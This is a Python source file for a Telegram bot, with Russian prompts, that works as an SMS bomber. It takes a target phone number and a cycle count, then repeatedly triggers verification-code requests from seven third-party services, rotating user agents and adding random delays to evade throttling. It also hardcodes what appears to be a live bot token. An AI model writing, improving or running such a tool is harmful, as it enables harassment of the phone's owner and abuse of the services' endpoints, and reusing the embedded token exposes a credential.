import asyncio
import logging
import random
import time
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import Message

TOKEN = "8676884588:AAFy8GLWAfTExVAqHLbbf_qIOPPxgNkQOfE"

class SpamState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

bot = Bot(token=TOKEN)
dp = Dispatcher()

SERVICES = [
    {"name": "PressCode", "url": "https://cabinet.presscode.app/api/auth/send-code", "method": "post", "data": "json"},
    {"name": "Bot-T", "url": "https://bot-t.com/api/sendCode", "method": "post", "data": "json"},
    {"name": "Teleme", "url": "https://teleme.io/api/auth/request-code", "method": "post", "data": "json"},
    {"name": "SMS-activate", "url": "https://sms-activate.org/stubs/handler_api.php", "method": "get", "data": "params"},
    {"name": "5sim", "url": "https://5sim.net/v1/user/buy/activation", "method": "get", "data": "params"},
    {"name": "Onlinesim", "url": "https://onlinesim.ru/api/getNum.php", "method": "get", "data": "params"},
    {"name": "SMSPool", "url": "https://smspool.net/api/request.php", "method": "post", "data": "form"}
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
]

def send_request(service, phone):
    session = requests.Session()
    session.headers.update({"User-Agent": random.choice(USER_AGENTS)})
    try:
        if service["method"] == "post" and service["data"] == "json":
            resp = session.post(service["url"], json={"phone": phone, "number": phone}, timeout=10)
        elif service["method"] == "post" and service["data"] == "form":
            resp = session.post(service["url"], data={"phone": phone, "number": phone}, timeout=10)
        else:
            resp = session.get(service["url"], params={"phone": phone, "number": phone}, timeout=10)
        return resp.status_code
    except:
        return 0

@dp.message(Command("start"))
async def start_cmd(message: Message):
    await message.answer("Отправь /spam")

@dp.message(Command("spam"))
async def spam_cmd(message: Message, state: FSMContext):
    await state.set_state(SpamState.waiting_phone)
    await message.answer("Введи номер (+77771234567)")

@dp.message(SpamState.waiting_phone)
async def phone_received(message: Message, state: FSMContext):
    phone = message.text.strip()
    if not phone.startswith('+') or len(phone) < 10:
        await message.answer("Некорректный номер")
        return
    await state.update_data(phone=phone)
    await state.set_state(SpamState.waiting_count)
    await message.answer("Количество циклов (число)")

@dp.message(SpamState.waiting_count)
async def count_received(message: Message, state: FSMContext):
    try:
        count = int(message.text.strip())
        if count <= 0:
            await message.answer("Положительное число")
            return
    except ValueError:
        await message.answer("Введи чисо")
        return
    data = await state.get_data()
    phone = data.get("phone")
    await state.clear()
    await message.answer(f"Начинаю спам на {phone} - {count} циклов по 7 сервисов")
    asyncio.create_task(spam_worker(message, phone, count))

async def spam_worker(message: Message, phone: str, count: int):
    total = 0
    for cycle in range(count):
        for service in SERVICES:
            status = send_request(service, phone)
            total += 1
            if status == 200 or status == 201:
                await message.answer(f"[{cycle+1}/{count}] {service['name']} -> OK (200)")
            else:
                await message.answer(f"[{cycle+1}/{count}] {service['name']} -> {status}")
            await asyncio.sleep(random.randint(2, 5))
        await message.answer(f"Цикл {cycle+1}/{count} завершён. Пауза 10 сек.")
        await asyncio.sleep(10)
    await message.answer(f"Готово. Отправлено {total} запросов.")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    dp.run_polling(bot)
